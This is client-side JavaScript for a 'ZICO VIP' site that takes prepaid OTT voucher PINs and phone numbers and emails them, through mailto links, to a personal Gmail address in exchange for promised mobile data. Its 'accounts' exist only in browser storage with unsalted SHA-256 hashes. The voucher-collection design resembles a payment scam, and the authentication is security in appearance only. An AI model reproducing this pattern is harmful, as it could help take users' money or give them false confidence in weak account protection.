const VIP_EMAIL = "matibackubu@gmail.com";
const USERS_KEY = "zicoVipUsers";       // localStorage: array of {email, hash, createdAt}
const SESSION_KEY = "zicoVipSession";   // sessionStorage: logged-in email
const HISTORY_PREFIX = "zicoVipHistory_"; // localStorage per user: array of redemptions (no PIN stored)

// ---------- Validation helpers ----------
function normalizePhone(raw) { return raw.replace(/[\s-]/g, ""); }
function isValidSAPhone(raw) {
  const v = normalizePhone(raw).replace(/^\+/, "");
  return /^0\d{9}$/.test(v) || /^27\d{9}$/.test(v);
}
function normalizeVoucherPin(raw) { return raw.replace(/[\s-]/g, ""); }
function isValidVoucherPin(raw) { return /^\d{12,20}$/.test(normalizeVoucherPin(raw)); }
function setFieldState(input, errorEl, valid, message) {
  if (valid) {
    input.classList.remove("invalid");
    if (errorEl) { errorEl.textContent = ""; errorEl.classList.remove("show"); }
  } else {
    input.classList.add("invalid");
    if (errorEl) { errorEl.textContent = message; errorEl.classList.add("show"); }
  }
}

// ---------- Password hashing (SHA-256, client-side demo) ----------
async function hashPassword(password) {
  const enc = new TextEncoder().encode(password);
  const buf = await crypto.subtle.digest("SHA-256", enc);
  return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, "0")).join("");
}

// ---------- User storage ----------
function getUsers() {
  try { return JSON.parse(localStorage.getItem(USERS_KEY)) || []; }
  catch { return []; }
}
function saveUsers(users) { localStorage.setItem(USERS_KEY, JSON.stringify(users)); }
function findUser(email) {
  const key = email.trim().toLowerCase();
  return getUsers().find(u => u.email === key);
}

function getHistory(email) {
  try { return JSON.parse(localStorage.getItem(HISTORY_PREFIX + email)) || []; }
  catch { return []; }
}
function addHistory(email, entry) {
  const list = getHistory(email);
  list.unshift(entry);
  localStorage.setItem(HISTORY_PREFIX + email, JSON.stringify(list));
  return list;
}

// ---------- Session ----------
function setSession(email) { sessionStorage.setItem(SESSION_KEY, email); }
function clearSession() { sessionStorage.removeItem(SESSION_KEY); }
function currentSessionEmail() { return sessionStorage.getItem(SESSION_KEY); }

// ---------- DOM refs ----------
const signedOut = document.getElementById("signedOut");
const dashboard = document.getElementById("dashboard");

const createForm = document.getElementById("createForm");
const createStatus = document.getElementById("createStatus");
const emailInput = document.getElementById("email");
const emailError = document.getElementById("emailError");
const passwordInput = document.getElementById("password");
const passwordError = document.getElementById("passwordError");
const confirmInput = document.getElementById("confirm");
const confirmError = document.getElementById("confirmError");
const accountFeePinInput = document.getElementById("accountFeePin");
const accountFeePinError = document.getElementById("accountFeePinError");
const accountCellInput = document.getElementById("accountCell");
const accountCellError = document.getElementById("accountCellError");

const loginForm = document.getElementById("loginForm");
const loginStatus = document.getElementById("loginStatus");

const dashEmail = document.getElementById("dashEmail");
const avatarInitial = document.getElementById("avatarInitial");
const logoutBtn = document.getElementById("logoutBtn");

const redeemForm = document.getElementById("redeemForm");
const redeemPlanInput = document.getElementById("redeemPlan");
const redeemNetwork = document.getElementById("redeemNetwork");
const redeemCell = document.getElementById("redeemCell");
const redeemCellError = document.getElementById("redeemCellError");
const redeemPin = document.getElementById("redeemPin");
const redeemPinError = document.getElementById("redeemPinError");
const redeemNotes = document.getElementById("redeemNotes");
const redeemStatus = document.getElementById("redeemStatus");
const historyList = document.getElementById("historyList");

// ---------- View switching ----------
function showDashboard(email) {
  signedOut.classList.add("hidden");
  dashboard.classList.remove("hidden");
  dashEmail.textContent = email;
  avatarInitial.textContent = email.charAt(0).toUpperCase();
  renderHistory(email);
  dashboard.scrollIntoView({ behavior: "smooth", block: "start" });
}
function showSignedOut() {
  dashboard.classList.add("hidden");
  signedOut.classList.remove("hidden");
}

function renderHistory(email) {
  const list = getHistory(email);
  if (list.length === 0) {
    historyList.innerHTML = `<div class="empty-state">No redemptions yet — choose a plan above to get started.</div>`;
    return;
  }
  historyList.innerHTML = list.map(item => `
    <div class="history-item">
      <div>
        <div class="tag">${item.plan}</div>
        <div class="meta">${item.network} · sent to ${item.cell}</div>
      </div>
      <div class="meta">${item.date}</div>
    </div>
  `).join("");
}

// ---------- Create account ----------
accountFeePinInput.addEventListener("blur", () => {
  setFieldState(accountFeePinInput, accountFeePinError, accountFeePinInput.value.trim() === "" || isValidVoucherPin(accountFeePinInput.value), "Enter the full 12–20 digit OTT voucher PIN, numbers only.");
});
accountCellInput.addEventListener("blur", () => {
  setFieldState(accountCellInput, accountCellError, accountCellInput.value.trim() === "" || isValidSAPhone(accountCellInput.value), "Enter a valid SA mobile number, e.g. 082 123 4567.");
});

createForm.addEventListener("submit", async (e) => {
  e.preventDefault();
  const email = emailInput.value.trim().toLowerCase();
  const password = passwordInput.value;
  const confirm = confirmInput.value;
  const feePin = accountFeePinInput.value.trim();
  const cell = accountCellInput.value.trim();

  const emailOk = /^\S+@\S+\.\S+$/.test(email);
  const passOk = password.length >= 8;
  const confirmOk = password === confirm;
  const feePinOk = isValidVoucherPin(feePin);
  const cellOk = isValidSAPhone(cell);
  setFieldState(emailInput, emailError, emailOk, "Enter a valid email address.");
  setFieldState(passwordInput, passwordError, passOk, "Password must be at least 8 characters.");
  setFieldState(confirmInput, confirmError, confirmOk, "Passwords do not match.");
  setFieldState(accountFeePinInput, accountFeePinError, feePinOk, "Enter the full 12–20 digit OTT voucher PIN, numbers only.");
  setFieldState(accountCellInput, accountCellError, cellOk, "Enter a valid SA mobile number, e.g. 082 123 4567.");

  if (!emailOk || !passOk || !confirmOk || !feePinOk || !cellOk) {
    createStatus.textContent = "Please fix the highlighted fields.";
    createStatus.className = "status err";
    return;
  }

  if (findUser(email)) {
    createStatus.textContent = "An account already exists for this email — log in below instead.";
    createStatus.className = "status err";
    return;
  }

  // Send the R40 account-fee voucher to the business for confirmation — same
  // payment method as the rest of the site, no card/EFT gateway involved.
  const subject = `ZICO VIP Account — R40 fee (10GB) — ${email}`;
  const body =
`Dear ZICO Team,

A new VIP account has been created and the R40 account fee voucher below needs to be confirmed:

────────────────────────────────
VIP ACCOUNT — R40 FEE
────────────────────────────────
Account email:       ${email}
Cell number:          ${cell}
R40 OTT voucher PIN: ${feePin}
Includes:             10GB welcome data
Requested:            ${new Date().toLocaleString("en-ZA")}
────────────────────────────────

Please confirm the voucher and load the 10GB onto the number above once confirmed. If it doesn't check out, this account should be disabled on our side.

Thank you.`;

  window.location.href = `mailto:${VIP_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;

  const hash = await hashPassword(password);
  const users = getUsers();
  users.push({ email, hash, createdAt: new Date().toISOString() });
  saveUsers(users);

  createStatus.textContent = "Your R40 voucher has been sent for confirmation — check your email app to send it. Your 10GB will be loaded once it's confirmed. Your VIP dashboard is ready below.";
  createStatus.className = "status ok";
  createForm.reset();

  setSession(email);
  showDashboard(email);
});

// ---------- Login ----------
loginForm.addEventListener("submit", async (e) => {
  e.preventDefault();
  const email = document.getElementById("loginEmail").value.trim().toLowerCase();
  const password = document.getElementById("loginPassword").value;

  const user = findUser(email);
  if (!user) {
    loginStatus.textContent = "No VIP account found for that email.";
    loginStatus.className = "status err";
    return;
  }

  const hash = await hashPassword(password);
  if (hash !== user.hash) {
    loginStatus.textContent = "Incorrect password.";
    loginStatus.className = "status err";
    return;
  }

  loginStatus.textContent = "";
  loginForm.reset();
  setSession(email);
  showDashboard(email);
});

// ---------- Logout ----------
logoutBtn.addEventListener("click", () => {
  clearSession();
  showSignedOut();
});

// ---------- Plan selection ----------
document.querySelectorAll(".plan").forEach(btn => {
  btn.addEventListener("click", () => {
    redeemPlanInput.value = btn.dataset.plan;
    document.getElementById("redeemPanel").scrollIntoView({ behavior: "smooth", block: "start" });
  });
});

// ---------- Redeem voucher (sends immediately via email) ----------
redeemCell.addEventListener("blur", () => {
  setFieldState(redeemCell, redeemCellError, redeemCell.value.trim() === "" || isValidSAPhone(redeemCell.value), "Enter a valid SA mobile number, e.g. 082 123 4567.");
});
redeemPin.addEventListener("blur", () => {
  setFieldState(redeemPin, redeemPinError, redeemPin.value.trim() === "" || isValidVoucherPin(redeemPin.value), "Enter the full 12–20 digit OTT voucher PIN, numbers only.");
});

redeemForm.addEventListener("submit", (e) => {
  e.preventDefault();
  const email = currentSessionEmail();
  if (!email) { showSignedOut(); return; }

  const plan = redeemPlanInput.value.trim();
  const network = redeemNetwork.value;
  const cell = redeemCell.value.trim();
  const pin = redeemPin.value.trim();
  const notes = redeemNotes.value.trim();

  const planOk = plan !== "";
  const cellOk = isValidSAPhone(cell);
  const pinOk = isValidVoucherPin(pin);
  setFieldState(redeemCell, redeemCellError, cellOk, "Enter a valid SA mobile number, e.g. 082 123 4567.");
  setFieldState(redeemPin, redeemPinError, pinOk, "Enter the full 12–20 digit OTT voucher PIN, numbers only.");

  if (!planOk) {
    redeemStatus.textContent = "Choose a subscription plan above first.";
    redeemStatus.className = "status err";
    return;
  }
  if (!cellOk || !pinOk) {
    redeemStatus.textContent = "Please fix the highlighted fields before sending.";
    redeemStatus.className = "status err";
    return;
  }

  const subject = `ZICO VIP Redeem — ${email} — ${network}`;
  const body =
`Dear ZICO Team,

A VIP member would like to redeem a voucher for their subscription. Details below:

────────────────────────────────
VIP REDEMPTION
────────────────────────────────
Account email:      ${email}
Plan:                ${plan}
Network:             ${network}
Cell number:         ${cell}
OTT voucher PIN:     ${pin}
Notes:               ${notes || "None"}
────────────────────────────────

Please confirm the voucher and load the data onto the number above.

Thank you.`;

  window.location.href = `mailto:${VIP_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;

  const list = addHistory(email, {
    plan,
    network,
    cell,
    date: new Date().toLocaleString("en-ZA", { day: "2-digit", month: "short", year: "numeric", hour: "2-digit", minute: "2-digit" })
  });
  renderHistory(email);

  redeemStatus.textContent = "Voucher sent — check your email app to confirm and send it.";
  redeemStatus.className = "status ok";
  redeemPin.value = "";
});

// ---------- Restore session on load ----------
(function init() {
  const email = currentSessionEmail();
  if (email && findUser(email)) {
    showDashboard(email);
  } else {
    clearSession();
    showSignedOut();
  }
})();
